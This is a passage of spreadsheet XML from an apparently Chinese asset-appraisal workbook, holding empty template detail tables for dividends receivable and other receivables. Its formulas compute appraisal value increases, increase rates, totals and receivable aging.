      <c r="K18" s="555">
        <f>IF(H18=0,"",J18/H18*100)</f>
        <v/>
      </c>
      <c r="L18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customHeight="1" s="415">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="587" t="n"/>
      <c r="E19" s="565" t="n"/>
      <c r="F19" s="380" t="n"/>
      <c r="G19" s="380" t="n"/>
      <c r="H19" s="555" t="n"/>
      <c r="I19" s="555" t="n"/>
      <c r="J19" s="555">
        <f>I19-H19</f>
        <v/>
      </c>
      <c r="K19" s="555">
        <f>IF(H19=0,"",J19/H19*100)</f>
        <v/>
      </c>
      <c r="L19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customHeight="1" s="415">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="587" t="n"/>
      <c r="E20" s="565" t="n"/>
      <c r="F20" s="380" t="n"/>
      <c r="G20" s="380" t="n"/>
      <c r="H20" s="555" t="n"/>
      <c r="I20" s="555" t="n"/>
      <c r="J20" s="555">
        <f>I20-H20</f>
        <v/>
      </c>
      <c r="K20" s="555">
        <f>IF(H20=0,"",J20/H20*100)</f>
        <v/>
      </c>
      <c r="L20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customHeight="1" s="415">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="587" t="n"/>
      <c r="E21" s="565" t="n"/>
      <c r="F21" s="380" t="n"/>
      <c r="G21" s="380" t="n"/>
      <c r="H21" s="555" t="n"/>
      <c r="I21" s="555" t="n"/>
      <c r="J21" s="555">
        <f>I21-H21</f>
        <v/>
      </c>
      <c r="K21" s="555">
        <f>IF(H21=0,"",J21/H21*100)</f>
        <v/>
      </c>
      <c r="L21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customHeight="1" s="415">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="587" t="n"/>
      <c r="E22" s="565" t="n"/>
      <c r="F22" s="380" t="n"/>
      <c r="G22" s="380" t="n"/>
      <c r="H22" s="555" t="n"/>
      <c r="I22" s="555" t="n"/>
      <c r="J22" s="555">
        <f>I22-H22</f>
        <v/>
      </c>
      <c r="K22" s="555">
        <f>IF(H22=0,"",J22/H22*100)</f>
        <v/>
      </c>
      <c r="L22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customHeight="1" s="415">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="587" t="n"/>
      <c r="E23" s="565" t="n"/>
      <c r="F23" s="380" t="n"/>
      <c r="G23" s="380" t="n"/>
      <c r="H23" s="555" t="n"/>
      <c r="I23" s="555" t="n"/>
      <c r="J23" s="555">
        <f>I23-H23</f>
        <v/>
      </c>
      <c r="K23" s="555">
        <f>IF(H23=0,"",J23/H23*100)</f>
        <v/>
      </c>
      <c r="L23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customHeight="1" s="415">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="587" t="n"/>
      <c r="E24" s="565" t="n"/>
      <c r="F24" s="380" t="n"/>
      <c r="G24" s="380" t="n"/>
      <c r="H24" s="555" t="n"/>
      <c r="I24" s="555" t="n"/>
      <c r="J24" s="555">
        <f>I24-H24</f>
        <v/>
      </c>
      <c r="K24" s="555">
        <f>IF(H24=0,"",J24/H24*100)</f>
        <v/>
      </c>
      <c r="L24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customHeight="1" s="415">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="587" t="n"/>
      <c r="E25" s="565" t="n"/>
      <c r="F25" s="380" t="n"/>
      <c r="G25" s="380" t="n"/>
      <c r="H25" s="555" t="n"/>
      <c r="I25" s="555" t="n"/>
      <c r="J25" s="555">
        <f>I25-H25</f>
        <v/>
      </c>
      <c r="K25" s="555">
        <f>IF(H25=0,"",J25/H25*100)</f>
        <v/>
      </c>
      <c r="L25" s="383" t="n"/>
    </row>
    <row r="26" ht="16.5" customHeight="1" s="415">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="587" t="n"/>
      <c r="E26" s="565" t="n"/>
      <c r="F26" s="380" t="n"/>
      <c r="G26" s="380" t="n"/>
      <c r="H26" s="555" t="n"/>
      <c r="I26" s="555" t="n"/>
      <c r="J26" s="555">
        <f>I26-H26</f>
        <v/>
      </c>
      <c r="K26" s="555">
        <f>IF(H26=0,"",J26/H26*100)</f>
        <v/>
      </c>
      <c r="L26" s="383" t="n"/>
    </row>
    <row r="27" ht="16.5" customHeight="1" s="415">
      <c r="A27" s="116" t="n"/>
      <c r="B27" s="380" t="n"/>
      <c r="C27" s="381" t="n"/>
      <c r="D27" s="587" t="n"/>
      <c r="E27" s="565" t="n"/>
      <c r="F27" s="380" t="n"/>
      <c r="G27" s="380" t="n"/>
      <c r="H27" s="555" t="n"/>
      <c r="I27" s="555" t="n"/>
      <c r="J27" s="555">
        <f>I27-H27</f>
        <v/>
      </c>
      <c r="K27" s="555">
        <f>IF(H27=0,"",J27/H27*100)</f>
        <v/>
      </c>
      <c r="L27" s="383" t="n"/>
    </row>
    <row r="28" ht="16.5" customHeight="1" s="415">
      <c r="A28" s="116" t="n"/>
      <c r="B28" s="380" t="n"/>
      <c r="C28" s="381" t="n"/>
      <c r="D28" s="587" t="n"/>
      <c r="E28" s="565" t="n"/>
      <c r="F28" s="380" t="n"/>
      <c r="G28" s="380" t="n"/>
      <c r="H28" s="555" t="n"/>
      <c r="I28" s="555" t="n"/>
      <c r="J28" s="555">
        <f>I28-H28</f>
        <v/>
      </c>
      <c r="K28" s="555">
        <f>IF(H28=0,"",J28/H28*100)</f>
        <v/>
      </c>
      <c r="L28" s="383" t="n"/>
    </row>
    <row r="29" ht="16.5" customHeight="1" s="415">
      <c r="A29" s="116" t="n"/>
      <c r="B29" s="380" t="n"/>
      <c r="C29" s="381" t="n"/>
      <c r="D29" s="587" t="n"/>
      <c r="E29" s="565" t="n"/>
      <c r="F29" s="380" t="n"/>
      <c r="G29" s="380" t="n"/>
      <c r="H29" s="555" t="n"/>
      <c r="I29" s="555" t="n"/>
      <c r="J29" s="555">
        <f>I29-H29</f>
        <v/>
      </c>
      <c r="K29" s="555">
        <f>IF(H29=0,"",J29/H29*100)</f>
        <v/>
      </c>
      <c r="L29" s="383" t="n"/>
    </row>
    <row r="30" ht="18" customHeight="1" s="415">
      <c r="A30" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B30" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C30" s="567" t="n"/>
      <c r="D30" s="383" t="n"/>
      <c r="E30" s="580">
        <f>ROUND(SUM(E6:E29),2)</f>
        <v/>
      </c>
      <c r="F30" s="383" t="n"/>
      <c r="G30" s="383" t="n"/>
      <c r="H30" s="555">
        <f>ROUND(SUM(H6:H29),2)</f>
        <v/>
      </c>
      <c r="I30" s="555">
        <f>ROUND(SUM(I6:I29),2)</f>
        <v/>
      </c>
      <c r="J30" s="555">
        <f>I30-H30</f>
        <v/>
      </c>
      <c r="K30" s="555">
        <f>IF(H30=0,"",J30/H30*100)</f>
        <v/>
      </c>
      <c r="L30" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="3">
    <mergeCell ref="B2:L2"/>
    <mergeCell ref="B30:C30"/>
    <mergeCell ref="B1:L1"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:L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8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 codeName="Sheet25">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:J30"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A6" sqref="A6:A29"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="13.6666666666667" customWidth="1" style="410" min="1" max="1"/>
    <col width="11.1666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col width="23.1666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="11.5" customWidth="1" style="410" min="4" max="4"/>
    <col width="20.6666666666667" customWidth="1" style="410" min="5" max="5"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="6" max="6"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="7" max="8"/>
    <col outlineLevel="1" width="11.1666666666667" customWidth="1" style="410" min="9" max="9"/>
    <col width="16.1666666666667" customWidth="1" style="410" min="10" max="10"/>
    <col width="9" customWidth="1" style="410" min="11" max="16384"/>
  </cols>
  <sheetData>
    <row r="1" ht="26" customFormat="1" customHeight="1" s="368">
      <c r="A1" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B1" s="371" t="inlineStr">
        <is>
          <t>其他应收款—应收股利评估明细表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="16.5" customHeight="1" s="415">
      <c r="A2" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B2" s="547">
        <f>'3-8其他应收款汇总'!B2:H2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402" t="inlineStr">
        <is>
          <t>表3-8-2</t>
        </is>
      </c>
    </row>
    <row r="4" ht="16.5" customHeight="1" s="415">
      <c r="A4" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B4" s="549">
        <f>'3-8其他应收款汇总'!B4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股利（利润）所属期间</t>
        </is>
      </c>
      <c r="F5" s="380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6.5" customHeight="1" s="415">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="381" t="n"/>
      <c r="D6" s="587" t="n"/>
      <c r="E6" s="383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Height="1" s="415">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="587" t="n"/>
      <c r="E7" s="383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Height="1" s="415">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="587" t="n"/>
      <c r="E8" s="383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6.5" customHeight="1" s="415">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="587" t="n"/>
      <c r="E9" s="383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6.5" customHeight="1" s="415">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="587" t="n"/>
      <c r="E10" s="383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Height="1" s="415">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="587" t="n"/>
      <c r="E11" s="383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Height="1" s="415">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="587" t="n"/>
      <c r="E12" s="383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Height="1" s="415">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="587" t="n"/>
      <c r="E13" s="383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Height="1" s="415">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="587" t="n"/>
      <c r="E14" s="383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Height="1" s="415">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="587" t="n"/>
      <c r="E15" s="383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Height="1" s="415">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="587" t="n"/>
      <c r="E16" s="383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Height="1" s="415">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="587" t="n"/>
      <c r="E17" s="383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Height="1" s="415">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="587" t="n"/>
      <c r="E18" s="383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Height="1" s="415">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="587" t="n"/>
      <c r="E19" s="383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Height="1" s="415">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="587" t="n"/>
      <c r="E20" s="383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Height="1" s="415">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="587" t="n"/>
      <c r="E21" s="383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Height="1" s="415">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="587" t="n"/>
      <c r="E22" s="383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Height="1" s="415">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="587" t="n"/>
      <c r="E23" s="383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Height="1" s="415">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="587" t="n"/>
      <c r="E24" s="383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Height="1" s="415">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="587" t="n"/>
      <c r="E25" s="383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Height="1" s="415">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="587" t="n"/>
      <c r="E26" s="383" t="n"/>
      <c r="F26" s="555" t="n"/>
      <c r="G26" s="555" t="n"/>
      <c r="H26" s="555">
        <f>G26-F26</f>
        <v/>
      </c>
      <c r="I26" s="555">
        <f>IF(F26=0,"",H26/F26*100)</f>
        <v/>
      </c>
      <c r="J26" s="383" t="n"/>
    </row>
    <row r="27" ht="16.5" customHeight="1" s="415">
      <c r="A27" s="116" t="n"/>
      <c r="B27" s="380" t="n"/>
      <c r="C27" s="381" t="n"/>
      <c r="D27" s="587" t="n"/>
      <c r="E27" s="383" t="n"/>
      <c r="F27" s="555" t="n"/>
      <c r="G27" s="555" t="n"/>
      <c r="H27" s="555">
        <f>G27-F27</f>
        <v/>
      </c>
      <c r="I27" s="555">
        <f>IF(F27=0,"",H27/F27*100)</f>
        <v/>
      </c>
      <c r="J27" s="383" t="n"/>
    </row>
    <row r="28" ht="16.5" customHeight="1" s="415">
      <c r="A28" s="116" t="n"/>
      <c r="B28" s="380" t="n"/>
      <c r="C28" s="381" t="n"/>
      <c r="D28" s="587" t="n"/>
      <c r="E28" s="383" t="n"/>
      <c r="F28" s="555" t="n"/>
      <c r="G28" s="555" t="n"/>
      <c r="H28" s="555">
        <f>G28-F28</f>
        <v/>
      </c>
      <c r="I28" s="555">
        <f>IF(F28=0,"",H28/F28*100)</f>
        <v/>
      </c>
      <c r="J28" s="383" t="n"/>
    </row>
    <row r="29" ht="16.5" customHeight="1" s="415">
      <c r="A29" s="116" t="n"/>
      <c r="B29" s="380" t="n"/>
      <c r="C29" s="381" t="n"/>
      <c r="D29" s="587" t="n"/>
      <c r="E29" s="383" t="n"/>
      <c r="F29" s="555" t="n"/>
      <c r="G29" s="555" t="n"/>
      <c r="H29" s="555">
        <f>G29-F29</f>
        <v/>
      </c>
      <c r="I29" s="555">
        <f>IF(F29=0,"",H29/F29*100)</f>
        <v/>
      </c>
      <c r="J29" s="383" t="n"/>
    </row>
    <row r="30" ht="16.5" customHeight="1" s="415">
      <c r="A30" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B30" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C30" s="567" t="n"/>
      <c r="D30" s="115" t="n"/>
      <c r="E30" s="383" t="n"/>
      <c r="F30" s="555">
        <f>ROUND(SUM(F6:F29),2)</f>
        <v/>
      </c>
      <c r="G30" s="555">
        <f>ROUND(SUM(G6:G29),2)</f>
        <v/>
      </c>
      <c r="H30" s="555">
        <f>G30-F30</f>
        <v/>
      </c>
      <c r="I30" s="555">
        <f>IF(F30=0,"",H30/F30*100)</f>
        <v/>
      </c>
      <c r="J30" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="3">
    <mergeCell ref="B1:J1"/>
    <mergeCell ref="B30:C30"/>
    <mergeCell ref="B2:J2"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:J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9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 codeName="Sheet26">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:N31"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A6" sqref="A6:A26"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="16.3333333333333" customWidth="1" style="410" min="1" max="1"/>
    <col width="10.6666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col width="29" customWidth="1" style="410" min="3" max="3"/>
    <col width="10.3333333333333" customWidth="1" style="410" min="4" max="4"/>
    <col width="10.8333333333333" customWidth="1" style="410" min="5" max="6"/>
    <col outlineLevel="1" width="10.8333333333333" customWidth="1" style="410" min="7" max="9"/>
    <col width="12.6666666666667" customWidth="1" style="410" min="10" max="10"/>
    <col outlineLevel="1" width="12.6666666666667" customWidth="1" style="410" min="11" max="12"/>
    <col outlineLevel="1" width="8.66666666666667" customWidth="1" style="410" min="13" max="13"/>
    <col width="12.3333333333333" customWidth="1" style="410" min="14" max="14"/>
    <col width="9" customWidth="1" style="410" min="15" max="16384"/>
  </cols>
  <sheetData>
    <row r="1" ht="27.75" customFormat="1" customHeight="1" s="368">
      <c r="A1" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B1" s="371" t="inlineStr">
        <is>
          <t>其他应收款—其他应收款评估明细表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373" t="n"/>
      <c r="M3" s="373" t="n"/>
      <c r="N3" s="402" t="inlineStr">
        <is>
          <t>表3-8-3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586" t="n"/>
      <c r="K4" s="376" t="n"/>
      <c r="L4" s="376" t="n"/>
      <c r="M4" s="376" t="n"/>
      <c r="N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欠款单位（人）名称（结算对象)</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>业务内容</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>发生日期</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>账龄</t>
        </is>
      </c>
      <c r="G5" s="379" t="inlineStr">
        <is>
          <t>币种</t>
        </is>
      </c>
      <c r="H5" s="379" t="inlineStr">
        <is>
          <t>外币账面金额</t>
        </is>
      </c>
      <c r="I5" s="379" t="inlineStr">
        <is>
          <t>评估基准日汇率</t>
        </is>
      </c>
      <c r="J5" s="307" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="K5" s="380" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="L5" s="380" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="M5" s="380" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="N5" s="380" t="inlineStr">
        <is>
          <t>备注</t>
        </is>
      </c>
    </row>
    <row r="6" ht="16.5" customHeight="1" s="415">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="180" t="n"/>
      <c r="D6" s="185" t="n"/>
      <c r="E6" s="587" t="n"/>
      <c r="F6" s="380">
        <f>IF(E6="","",LOOKUP(DATEDIF(E6,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G6" s="380" t="n"/>
      <c r="H6" s="566" t="n"/>
      <c r="I6" s="380" t="n"/>
      <c r="J6" s="555" t="n"/>
      <c r="K6" s="555" t="n"/>
      <c r="L6" s="555">
        <f>K6-J6</f>
        <v/>
      </c>
      <c r="M6" s="555">
        <f>IF(J6=0,"",L6/J6*100)</f>
        <v/>
      </c>
      <c r="N6" s="383" t="n"/>
    </row>
    <row r="7" ht="16.5" customHeight="1" s="415">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="380" t="n"/>
      <c r="E7" s="587" t="n"/>
      <c r="F7" s="380">
        <f>IF(E7="","",LOOKUP(DATEDIF(E7,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G7" s="380" t="n"/>
      <c r="H7" s="566" t="n"/>
      <c r="I7" s="380" t="n"/>
      <c r="J7" s="555" t="n"/>
      <c r="K7" s="555" t="n"/>
      <c r="L7" s="555">
        <f>K7-J7</f>
        <v/>
      </c>
      <c r="M7" s="555">
        <f>IF(J7=0,"",L7/J7*100)</f>
        <v/>
      </c>
      <c r="N7" s="383" t="n"/>
    </row>
    <row r="8" ht="16.5" customHeight="1" s="415">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="380" t="n"/>
      <c r="E8" s="587" t="n"/>
      <c r="F8" s="380">
        <f>IF(E8="","",LOOKUP(DATEDIF(E8,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G8" s="380" t="n"/>
      <c r="H8" s="566" t="n"/>
      <c r="I8" s="380" t="n"/>
      <c r="J8" s="555" t="n"/>
      <c r="K8" s="555" t="n"/>
      <c r="L8" s="555">
        <f>K8-J8</f>
        <v/>
      </c>
      <c r="M8" s="555">
        <f>IF(J8=0,"",L8/J8*100)</f>
        <v/>
      </c>
      <c r="N8" s="383" t="n"/>
    </row>
    <row r="9" ht="16.5" customHeight="1" s="415">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="380" t="n"/>
      <c r="E9" s="587" t="n"/>
      <c r="F9" s="380">
        <f>IF(E9="","",LOOKUP(DATEDIF(E9,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G9" s="380" t="n"/>
      <c r="H9" s="566" t="n"/>
      <c r="I9" s="380" t="n"/>
      <c r="J9" s="555" t="n"/>
      <c r="K9" s="555" t="n"/>
      <c r="L9" s="555">
        <f>K9-J9</f>
        <v/>
      </c>
      <c r="M9" s="555">
        <f>IF(J9=0,"",L9/J9*100)</f>
        <v/>
      </c>
      <c r="N9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customHeight="1" s="415">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="380" t="n"/>
      <c r="E10" s="587" t="n"/>
      <c r="F10" s="380">
        <f>IF(E10="","",LOOKUP(DATEDIF(E10,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G10" s="380" t="n"/>
      <c r="H10" s="566" t="n"/>
      <c r="I10" s="380" t="n"/>
      <c r="J10" s="555" t="n"/>
      <c r="K10" s="555" t="n"/>
      <c r="L10" s="555">
        <f>K10-J10</f>
        <v/>
      </c>
      <c r="M10" s="555">
        <f>IF(J10=0,"",L10/J10*100)</f>
        <v/>
      </c>
      <c r="N10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customHeight="1" s="415">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="380" t="n"/>
      <c r="E11" s="587" t="n"/>
      <c r="F11" s="380">
        <f>IF(E11="","",LOOKUP(DATEDIF(E11,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G11" s="380" t="n"/>
      <c r="H11" s="566" t="n"/>
      <c r="I11" s="380" t="n"/>
      <c r="J11" s="555" t="n"/>
      <c r="K11" s="555" t="n"/>
      <c r="L11" s="555">
        <f>K11-J11</f>
        <v/>
      </c>
      <c r="M11" s="555">
        <f>IF(J11=0,"",L11/J11*100)</f>
        <v/>
      </c>
      <c r="N11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customHeight="1" s="415">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="380" t="n"/>
      <c r="E12" s="587" t="n"/>
      <c r="F12" s="380">
        <f>IF(E12="","",LOOKUP(DATEDIF(E12,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G12" s="380" t="n"/>
      <c r="H12" s="566" t="n"/>
      <c r="I12" s="380" t="n"/>
      <c r="J12" s="555" t="n"/>
      <c r="K12" s="555" t="n"/>
      <c r="L12" s="555">
        <f>K12-J12</f>
        <v/>
      </c>
      <c r="M12" s="555">
        <f>IF(J12=0,"",L12/J12*100)</f>
        <v/>
      </c>
      <c r="N12" s="383" t="n"/>
    </row>
    <row r="13" ht="16.5" customHeight="1" s="415">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="380" t="n"/>
      <c r="E13" s="587" t="n"/>
      <c r="F13" s="380">
        <f>IF(E13="","",LOOKUP(DATEDIF(E13,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G13" s="380" t="n"/>
      <c r="H13" s="566" t="n"/>
      <c r="I13" s="380" t="n"/>
      <c r="J13" s="555" t="n"/>
      <c r="K13" s="555" t="n"/>
      <c r="L13" s="555">
        <f>K13-J13</f>
        <v/>
      </c>
      <c r="M13" s="555">
        <f>IF(J13=0,"",L13/J13*100)</f>
        <v/>
      </c>
      <c r="N13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customHeight="1" s="415">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="380" t="n"/>
      <c r="E14" s="587" t="n"/>
      <c r="F14" s="380">
        <f>IF(E14="","",LOOKUP(DATEDIF(E14,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G14" s="380" t="n"/>
      <c r="H14" s="566" t="n"/>
      <c r="I14" s="380" t="n"/>
      <c r="J14" s="555" t="n"/>
      <c r="K14" s="555" t="n"/>
      <c r="L14" s="555">
        <f>K14-J14</f>
        <v/>
      </c>
      <c r="M14" s="555">
        <f>IF(J14=0,"",L14/J14*100)</f>
        <v/>
      </c>
      <c r="N14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customHeight="1" s="415">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="380" t="n"/>
      <c r="E15" s="587" t="n"/>
      <c r="F15" s="380">
        <f>IF(E15="","",LOOKUP(DATEDIF(E15,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G15" s="380" t="n"/>
      <c r="H15" s="566" t="n"/>
      <c r="I15" s="380" t="n"/>
      <c r="J15" s="555" t="n"/>
      <c r="K15" s="555" t="n"/>
      <c r="L15" s="555">
        <f>K15-J15</f>
        <v/>
      </c>
      <c r="M15" s="555">
        <f>IF(J15=0,"",L15/J15*100)</f>
        <v/>
      </c>
      <c r="N15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customHeight="1" s="415">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="380" t="n"/>
      <c r="E16" s="587" t="n"/>
      <c r="F16" s="380">
        <f>IF(E16="","",LOOKUP(DATEDIF(E16,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G16" s="380" t="n"/>
      <c r="H16" s="566" t="n"/>
      <c r="I16" s="380" t="n"/>
      <c r="J16" s="555" t="n"/>
      <c r="K16" s="555" t="n"/>
      <c r="L16" s="555">
        <f>K16-J16</f>
        <v/>
      </c>
      <c r="M16" s="555">
        <f>IF(J16=0,"",L16/J16*100)</f>
        <v/>
      </c>
      <c r="N16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customHeight="1" s="415">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="380" t="n"/>
      <c r="E17" s="587" t="n"/>
      <c r="F17" s="380">
        <f>IF(E17="","",LOOKUP(DATEDIF(E17,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
